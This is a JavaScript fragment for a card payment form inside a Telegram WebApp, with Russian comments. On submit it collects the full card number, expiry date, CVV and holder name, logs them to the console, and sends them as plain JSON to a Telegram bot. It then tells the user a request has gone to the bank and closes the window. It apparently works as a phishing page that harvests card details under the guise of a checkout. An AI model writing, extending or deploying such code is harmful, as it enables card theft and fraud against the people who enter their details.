// --- Отправка формы ---
paymentForm.addEventListener('submit', function (e) {
    e.preventDefault();

    // Валидация
    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
        alert('Please fill in all fields.');
        return;
    }

    const { transaction_id, amount, payment_id } = getUrlParams();

    // Подготавливаем данные
    const formData = {
        transaction_id: transaction_id,
        amount: amount,
        payment_id: payment_id,
        cardNumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        cardHolder: cardHolderInput.value.trim()
    };

    console.log("FormData:", formData);

    // Показываем сообщение пользователю
    paymentForm.innerHTML = `
        <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
            🔄 Мы отправили запрос в банк.<br>
            Пожалуйста, подождите...
        </p>
    `;

    // === Основная отправка через WebApp ===
    if (window.Telegram && window.Telegram.WebApp) {
        try {
            // Отправляем данные
            window.Telegram.WebApp.sendData(JSON.stringify(formData));
            console.log("Данные отправлены через sendData");

            // Устанавливаем callback для получения результата от бота
            window.Telegram.WebApp.onEvent('mainButtonClicked', function() {
                // Этот callback вызывается, когда бот отправил ответ через `answerWebAppQuery`
                // Но в вашем случае мы просто закрываем окно после отправки
                window.Telegram.WebApp.close();
            });

            // Если бот не ответит в течение 5 секунд, закрываем окно принудительно
            setTimeout(() => {
                console.log("Принудительное закрытие WebApp через 5 секунд");
                window.Telegram.WebApp.close();
            }, 5000);

        } catch (error) {
            console.error("Ошибка sendData:", error);
            alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
            window.Telegram.WebApp.close();
        }
    } else {
        console.warn("Telegram WebApp not found. Running in debug mode.");
        alert("Данные собраны (режим отладки).");
    }
});